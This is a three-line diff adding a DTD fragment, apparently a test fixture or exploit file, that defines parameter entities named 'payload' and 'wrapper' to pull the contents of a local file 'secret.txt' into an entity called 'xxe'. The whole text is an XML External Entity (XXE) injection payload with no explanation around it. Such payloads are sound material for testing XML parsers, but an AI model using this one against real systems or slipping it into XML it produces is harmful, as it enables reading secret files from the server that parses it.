@@ -1,0 +1,3 @@
+<!ENTITY % payload SYSTEM "secret.txt">
+<!ENTITY % wrapper "<!ENTITY xxe '%payload;'>">
+%wrapper;
